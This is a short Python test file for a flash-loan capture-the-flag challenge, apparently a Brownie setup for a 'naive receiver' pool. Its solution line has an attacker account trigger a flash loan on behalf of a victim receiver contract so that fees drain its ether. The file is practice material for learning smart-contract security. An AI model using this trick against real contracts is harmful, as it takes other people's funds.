from brownie import (accounts, Wei, FlashLoanReceiver, NaiveReceiverLenderPool)

ETHER_IN_POOL = Wei('1000 ether')  # Pool has 1000 ETH in balance
ETHER_IN_RECEIVER = Wei('10 ether')  # Receiver has 10 ETH in balance


def test_naive_receiver():

    # ** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE **
    deployer = accounts[0]
    user = accounts[1]
    attacker = accounts[2]

    pool = NaiveReceiverLenderPool.deploy({"from": deployer})
    deployer.transfer(pool.address, ETHER_IN_POOL)

    receiver = FlashLoanReceiver.deploy(pool.address, {"from": deployer})
    deployer.transfer(receiver.address, ETHER_IN_RECEIVER)

    # ** CODE YOUR EXPLOIT HERE **

    # SOLUTION
    # would have to repeat this transaction 10 times. not sure how to get the single-transaction bonus points...
    pool.flashLoan(receiver.address, Wei('10 ether'), {"from": attacker})

    assert receiver.balance() == Wei('9 ether')
